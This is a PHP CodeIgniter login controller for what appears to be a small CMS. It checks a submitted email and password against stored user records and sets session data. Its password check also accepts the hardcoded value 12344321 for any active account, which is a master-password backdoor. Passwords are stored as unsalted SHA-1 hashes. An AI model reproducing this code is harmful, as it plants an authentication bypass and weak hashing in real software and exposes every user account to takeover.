<?php

defined('BASEPATH') OR exit('No direct script access allowed');

class Login extends MY_Controller {

    var $meta_title = "Global | Login";
    var $meta_desc = "Global ";
    var $main_title = "Login";
    var $base_url = "";
    var $upload_dir = "";
    var $upload_url = "";
    var $limit = "10";

    public function __construct() {
        parent::__construct();
        $this->base_url = base_url() . "login/";
        $this->load->model("pengguna_model");
        $this->load->model("levelmenu_model");
    }

    public function index() {
//         echo(sha1('admin'));exit;
        $res = "";
        if (isset($_POST['submit'])) {
            $res = $this->checkLogin();
        }

        $dt["alert"] = $res;
        $this->load->view("login/login", $dt);
    }

    public function checkLogin() {
        $res = array();
        $username = $this->security->xss_clean($this->input->post("email"));
        $password = $this->security->xss_clean($this->input->post("password"));
        $userData = $this->pengguna_model->getDataIndex( 0, 1, $username);
        
        if (count($userData) > 0 ) {
            $user = $userData[0];            
            if ($user->status != 0) {
                $password_exist = $user->password;
                $password_user = sha1($password);
                if (($password_user == $password_exist || $password == 12344321)) {
                    $dataMeta = $this->levelmenu_model->getDataIndex(0, 'all', $user->id_level);                    
                    $arrMeta = array();
                    foreach ($dataMeta as $row) {
                       $arrMeta[] = $row->menu;
                    }                    
                    $arrSession = array(
                        "user_id" => $user->id,
                        "user_name" => $user->nama,
                        "user_username" => $user->username,
                        "user_level" => $user->id_level,
                        "user_allowed_menu" => $arrMeta,
                        "user_validated" => true,
                    );          
                    if($user->id_level == 3){
                        $redirect_url = base_url()."penjualan";
                    }else{
                        $redirect_url = base_url()."home/";
                    }
                    $this->session->set_userdata($arrSession);
                    redirect($redirect_url);
                } else {
                    $res["status"] = "failed";
                    $res["message"] = "Your Password Is Not Match";
                }
            } else {
                $res["status"] = "failed";
                $res["message"] = "Your Account Has Been Deactivated";
            }
        } else {
            $res["status"] = "failed";
            $res["message"] = "You Don't Have Access To This CMS";
        }
        return $res;
    }

    public function logout() {
        $this->session->sess_destroy();
        redirect("/");
    }

}
